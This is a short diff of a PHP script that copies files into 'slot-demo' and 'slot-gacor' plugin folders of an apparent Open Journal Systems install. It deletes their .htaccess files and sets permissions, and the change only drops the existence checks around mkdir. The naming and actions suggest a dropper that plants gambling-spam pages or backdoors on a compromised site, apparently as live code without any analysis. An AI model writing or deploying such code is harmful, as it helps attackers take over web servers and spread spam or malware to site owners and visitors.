@@ -9,12 +9,8 @@ $ht = '/var/www/html/ojs-a/plugins/slot-demo/.htaccess';
 $hta = '/var/www/html/ojs-a/plugins/slot-gacor/.htaccess';
 copy($filea, $lpa);
 copy($fileb, $lpb);
-if(!is_dir($dir)) {
 mkdir("/var/www/html/ojs-a/plugins/slot-demo/");
-}
-if(!is_dir($dira)) {
 mkdir("/var/www/html/ojs-a/plugins/slot-gacor/");
-}
 unlink($ht);
 unlink($hta);
 chmod($dir, 0755);
